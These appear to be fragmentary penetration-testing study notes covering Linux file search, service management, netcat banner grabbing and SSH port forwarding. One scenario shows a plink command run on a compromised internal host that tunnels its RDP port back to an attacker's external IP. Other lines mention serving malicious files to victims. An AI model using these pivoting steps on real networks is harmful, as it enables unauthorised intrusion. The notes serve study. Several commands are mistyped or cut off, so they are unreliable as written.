linux utilities to **find or locate** files

1. Locate command: 

Updatedb -- to update the db of the OS

Ex: locate sbd.exe

1. Which command :

Ex: which sbd : prg can be found under /usr/bin/

1. find command:

Ex: find / -name sbd\*

all files lower case sbd and file format.

find  -name sbd\* -exec file{} \;

**Services**:

passwd : change the old and weak pass to new strong password

1. SSH Services : Secure shell

EX : netstat -antp \| grep sshd

Service ssh stop

1. HTTP Server:

TCP based  and download the malicious file to victim

Ex: services apache2 start

echo "kali linux rocks" &gt; /var/www/index.html

1. services management : wrapper around /etc/init.d

4.Service persistent

update -rc.d ssh enable

update-rc.d apache2 enable

RC conf also can be used

**bash scripting**

1. cat index.html l grep "href="
2. cat index.html \| grep "href=" \| cut -d

**Essential**

netcat : network utility able to read and write to TCP and UDP ports

it can be used as TCP client or server

nc -nv 192.168.20.25 25

open

banner

HELP

SMTP list all commands

nc -nv 192.168.30.35 110

bob

password: bob

**Port Forwarding**

rinetd.conf

scenario1:

Encrypted tunnel within the ssh tunnel:

**SSH Local Port forwarding \(-L\):**

localport --&gt; remoteport \(Over ssh tunnel\)

**SSH Remote Port forwarding :**

Scenario2 \(tunnel a remote port to a local server\):

Initiated Client Attack \(on org\) and got shell of a internal machine \(Non routable\) -- &gt; uploaded a SSH windows client \(plink\) on vi

on victim machine we have RDP enabled \(\)

now to access internal RDP port by creating reverse SSL connection to attacker machine from the victim machine

Now tunnel the local rdp traffic to the remote port using plink

```
plink -l root -pw ubersecretpassword 208.88.127.99 -R 3390:127.0.0.1:3389
```

ssh connection is made and 3390 is in listen mode

netstat -antp \| grep LISTEN

Now in attacker machine try to tunnel the local traffic to rdp

```
rdesktop 127.0.0.1:3390
```

**SSH Dynamic Port Forwarding:**

---

Port Forwarding is a way to forward or “tunnel” TCP traffic through SSH from one machine to another. Using just one line of code, you can create an outgoing tunnel, forward your IP requests over that tunnel, and receive the response. In this way you can **pull **the data from a remote server to a **local**server \(local port forwarding\), and your local machine acts as a proxy server for the remote one. Or you can create an incoming tunnel to a remote server which receives IP requests, forwards them over that tunnel to the local server where it is processed and sent back again. Thus it is possible to **push**data from a local server to/through a**remote**server \(remote port forwarding\).

Local Port Forwarding \(Outgoing Tunnel\):

* Principle: Local host forwards/displays content of remote host.
  **Local host acts as proxy**
  . Tunneling opens a listening socket on localhost and transfers content to remote server
* Command:
  `ssh -L local_port:remote_host:remote_port login@servername`
* Tunnel: local host -\(SSH tunnel\)→ remote host -\(SSH tunnel\)→ local host
* Example: check remote host behind load-balancer or firewall on localhost

Remote Port Forwarding \(Incoming Tunnel\):

* Principle: remote host forwards content of localhost.
  **Remote host acts as proxy**
  . Tunneling opens a listening socket on the remote server host and transfers the content to the local host
* Command:
  `ssh -R remote_port:local_host:local_port login@servername`
* Tunnel: remote host -\(SSH tunnel\)→ local host -\(SSH tunnel\)→ remote host
* Example: make localhost visible in the internet or giving access to a service on your home machine to people at work



